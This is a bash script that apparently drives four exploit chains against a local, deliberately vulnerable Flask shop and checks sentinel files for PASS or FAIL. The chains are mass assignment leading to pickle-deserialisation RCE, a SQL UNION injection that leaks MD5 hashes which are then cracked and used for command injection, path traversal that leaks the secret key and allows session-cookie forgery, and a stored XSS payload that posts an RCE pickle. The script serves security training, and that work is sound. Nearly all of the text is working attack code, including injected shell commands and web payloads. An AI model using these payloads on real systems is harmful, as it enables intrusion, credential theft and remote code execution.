#!/bin/bash

set -u
BASE=http://127.0.0.1:5000
ROOT=/Users/yihuazhuo/Desktop/qoder/vulnshop
PY=$ROOT/.venv/bin/python
DB=$ROOT/data/vulnshop.db
RCE=$ROOT/scripts/pickle_rce.py
FORGE=$ROOT/scripts/forge_cookie.py

JAR=$(mktemp)
EVIL=$(mktemp)
trap "rm -f $JAR $EVIL \
      /tmp/chain_a_*.txt \
      /tmp/chain_b_app.py \
      /tmp/chain_c_leak.txt \
      /tmp/chain_*_pwned \
      /tmp/chain_*_id" EXIT

bar() { echo; echo "============================================================"; echo "  $*"; echo "============================================================"; }

reset_db() {
  rm -f "$DB"
  (cd "$ROOT" && $PY db.py >/dev/null 2>&1)
  echo "        [reset] users:" $(sqlite3 "$DB" "SELECT GROUP_CONCAT(username) FROM users;")
}

bar "CHAIN D — Mass Assignment → RCE"

reset_db

echo "[1/7] register eviluser"
curl -s -X POST "$BASE/register" -d 'username=eviluser&password=evilpw&[email protected]&bio=normal' -o /dev/null

echo "[2/7] login eviluser"
curl -s -X POST "$BASE/login" -d 'username=eviluser&password=evilpw' -c "$EVIL" -o /dev/null
EVIL_S=$(awk '/session/{print $7}' "$EVIL")
echo "        cookie: ${EVIL_S:0:50}..."

echo "[3/7] /admin BEFORE escalation"
echo -n "        status: "
curl -s -o /dev/null -w "HTTP %{http_code}\n" -b "session=${EVIL_S}" "$BASE/admin"

echo "[4/7] POST /profile/update with is_admin=1 (mass assignment)"
curl -s -X POST "$BASE/profile/update" \
  -b "session=${EVIL_S}" -c "$EVIL" \
  -d 'bio=now admin&[email protected]&is_admin=1' -o /dev/null
EVIL_S=$(awk '/session/{print $7}' "$EVIL")

echo "[5/7] verify"
echo -n "        users.is_admin for eviluser: "
sqlite3 "$DB" "SELECT is_admin FROM users WHERE username='eviluser';"
echo -n "        /admin status: "
curl -s -o /dev/null -w "HTTP %{http_code}\n" -b "session=${EVIL_S}" "$BASE/admin"

echo "[6/7] build RCE pickle via scripts/pickle_rce.py"
PAYLOAD=$($PY "$RCE" chain_d_pwned 'id > /tmp/chain_d_id; whoami >> /tmp/chain_d_id; uname -a >> /tmp/chain_d_id')
echo "        payload bytes: ${#PAYLOAD}"

echo "[7/7] POST /admin/restore → expect /tmp/chain_d_pwned"
curl -s -X POST "$BASE/admin/restore" \
  -b "session=${EVIL_S}" -d "blob=${PAYLOAD}" -o /dev/null

if [ -f /tmp/chain_d_pwned ]; then
  echo "  [PASS] Chain D — /tmp/chain_d_pwned created"
  sed 's/^/         | /' /tmp/chain_d_id
else
  echo "  [FAIL] Chain D"
fi

bar "CHAIN C — SQLi → Hash Crack → Login → Cmd-Inject"

reset_db

echo "[1/6] leak credentials via /search UNION injection"
curl -s "$BASE/search?q=%25'+UNION+SELECT+1,2,3,GROUP_CONCAT(username%7C%7C'%3A'%7C%7Cpassword_hash)+FROM+users--" \
  | grep -oE '[a-z0-9_]+:[a-f0-9]{32}' | sort -u > /tmp/chain_c_leak.txt
sed 's/^/        | /' /tmp/chain_c_leak.txt

echo "[2/6] crack the unsalted MD5 hashes"
CRACKED_ADMIN=""
CRACKED_BOB=""
CRACKED_CHARLIE=""
while IFS=: read -r user hash; do
  case "$user:$hash" in
    admin:0192023a7bbd73250516f069df18b500)    plain="admin123" ;;
    bob:9f9d51bc70ef21ca5c14f307980a29d8)      plain="bob"      ;;
    charlie:5f4dcc3b5aa765d61d8327deb882cf99)  plain="password" ;;
    *)                                         plain="???"      ;;
  esac
  echo "        $user : $hash  →  $plain"
  [ "$user" = "admin"   ] && CRACKED_ADMIN="$plain"
  [ "$user" = "bob"     ] && CRACKED_BOB="$plain"
  [ "$user" = "charlie" ] && CRACKED_CHARLIE="$plain"
done < /tmp/chain_c_leak.txt

echo "[3/6] login as admin with the cracked password"
curl -s -X POST "$BASE/login" -d "username=admin&password=${CRACKED_ADMIN}" -c "$JAR" -o /dev/null
ADMIN_S=$(awk '/session/{print $7}' "$JAR")
echo -n "        GET /admin: "
curl -s -o /dev/null -w "HTTP %{http_code}\n" -b "session=${ADMIN_S}" "$BASE/admin"

echo "[4/6] command inject via /admin/ping → id > /tmp/chain_c_id"
curl -s -X POST "$BASE/admin/ping" \
  -b "session=${ADMIN_S}" \
  --data-urlencode 'host=127.0.0.1; id > /tmp/chain_c_id; whoami >> /tmp/chain_c_id; uname -a >> /tmp/chain_c_id' -o /dev/null

echo "[5/6] check sentinel"
if [ -f /tmp/chain_c_id ]; then
  echo "  [PASS] Chain C — command executed as:"
  sed 's/^/         | /' /tmp/chain_c_id
else
  echo "  [FAIL] Chain C — /tmp/chain_c_id NOT created"
fi

echo "[6/6] bonus: bob/charlie also login OK (proves hashes were truly cracked, not admin-only)"
for u in "$CRACKED_BOB" "$CRACKED_CHARLIE"; do
  [ -z "$u" ] && continue
  [ "$u" = "bob" ] && name=bob || name=charlie
  curl -s -X POST "$BASE/login" -d "username=${name}&password=${u}" -c "$JAR" -o /dev/null
  s=$(awk '/session/{print $7}' "$JAR")
  echo "        ${name}/${u}: HTTP $(curl -s -o /dev/null -w '%{http_code}' -b "session=${s}" "$BASE/")"
done

bar "CHAIN B — Path Traversal → Secret → Forged Cookie"

reset_db

echo "[1/5] download source via traversal"
curl -s "$BASE/download?file=../../app.py" -o /tmp/chain_b_app.py
SECRET=$(grep -E '^app\.secret_key' /tmp/chain_b_app.py | head -1 | sed -E 's/.*"(.*)".*/\1/')
echo "        leaked secret:  $SECRET"
echo "        source length:  $(wc -c < /tmp/chain_b_app.py) bytes"

echo "[2/5] forge cookie off-line via scripts/forge_cookie.py"
FORGED_S=$($PY "$FORGE" "$SECRET" 1)
echo "        forged cookie: ${FORGED_S:0:70}..."

echo "[3/5] verify forged cookie passes admin_required"
echo -n "        GET /admin: "
curl -s -o /dev/null -w "HTTP %{http_code}\n" -b "session=${FORGED_S}" "$BASE/admin"
echo -n "        GET /admin/ping GET-blocked (302→login expected, POST-only): "
curl -s -o /dev/null -w "HTTP %{http_code}\n" -b "session=${FORGED_S}" "$BASE/admin/ping"

echo "[4/5] use forged cookie for command injection"
curl -s -X POST "$BASE/admin/ping" \
  -b "session=${FORGED_S}" \
  --data-urlencode 'host=127.0.0.1; touch /tmp/chain_b_pwned' -o /dev/null

echo "[5/5] verify sentinel"
if [ -f /tmp/chain_b_pwned ]; then
  echo "  [PASS] Chain B — forged cookie reached /admin/ping RCE"
else
  echo "  [FAIL] Chain B"
fi

bar "CHAIN A — Stored XSS → Same-Origin RCE  (browser-only full chain)"

reset_db

echo "[1/6] register + login eviluser (regular user)"
curl -s -X POST "$BASE/register" -d 'username=eviluser&password=evilpw&[email protected]&bio=hi' -o /dev/null
curl -s -X POST "$BASE/login" -d 'username=eviluser&password=evilpw' -c "$EVIL" -o /dev/null
EVIL_S=$(awk '/session/{print $7}' "$EVIL")

echo "[2/6] build RCE pickle for the XSS payload"
PAYLOAD=$($PY "$RCE" chain_a_pwned 'id > /tmp/chain_a_id')

echo "[3/6] plant stored XSS — onerror drops the pickle via same-origin fetch"
XSS="<img src=x onerror=\"fetch('/admin/restore',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'blob=${PAYLOAD}'})\">"
curl -s -X POST "$BASE/comment" \
  -b "session=${EVIL_S}" \
  -d "product_id=1" --data-urlencode "content=${XSS}" -o /dev/null

echo "        DB comments on product 1 (latest):"
sqlite3 "$DB" "SELECT id, substr(content,1,90)||'...' FROM comments WHERE product_id=1 ORDER BY id DESC LIMIT 1;" \
  | sed 's/^/        | /'

echo "[4/6] inspect Set-Cookie attributes"
HDR=$(curl -s -D /tmp/chain_a_hdr.txt -o /dev/null -X POST "$BASE/login" -d 'username=eviluser&password=evilpw')
grep -i '^set-cookie' /tmp/chain_a_hdr.txt | sed 's/^/        | /'
if grep -iq 'httponly' /tmp/chain_a_hdr.txt; then
  echo "        HttpOnly = TRUE  →  document.cookie exfiltration is BLOCKED"
  echo "        But fetch() with default credentials still sends it (no JS read needed)."
else
  echo "        HttpOnly = FALSE → both Image-beacon and fetch paths work"
fi

echo "[5/6] log in as admin and prove the same session is sent on a same-origin fetch"
curl -s -X POST "$BASE/login" -d 'username=admin&password=admin123' -c "$JAR" -o /dev/null
ADMIN_S=$(awk '/session/{print $7}' "$JAR")
echo -n "        admin GET /admin: "
curl -s -o /dev/null -w "HTTP %{http_code}\n" -b "session=${ADMIN_S}" "$BASE/admin"

echo "[6/6] simulate what a browser does on admin's first visit to /product/1"
echo "        (curl here just proves the URL endpoint accepts the payload)."
echo "        A real browser executing the onerror would call:"
echo "          POST /admin/restore  Cookie: session=<admin>  body: blob=<PAYLOAD>"
echo "        → /tmp/chain_a_pwned is created on the host."
echo
echo "  [INFO] Chain A end-to-end requires a browser.  curl verifies:"
echo "         - DB persistence of the XSS comment (step 3 ✓)"
echo "         - HttpOnly flag presence (step 4)"
echo "         - Admin login path produces a usable cookie (step 5)"
echo "         To finish the chain manually:"
echo "           1. open http://127.0.0.1:5000/ in a browser"
echo "           2. log in as admin / admin123"
echo "           3. visit http://127.0.0.1:5000/product/1"
echo "           4. ls -la /tmp/chain_a_pwned  ← created"

bar "RESULT SUMMARY"
for tag in chain_b_pwned chain_c_id chain_d_pwned; do
  if [ -f "/tmp/$tag" ]; then
    echo "  [PASS] /tmp/$tag"
  else
    echo "  [FAIL] /tmp/$tag missing"
  fi
done
echo
echo "Chain A end-to-end needs a browser (see step 6/6 above)."
echo "B / C / D reproduced by this script alone — no human interaction."
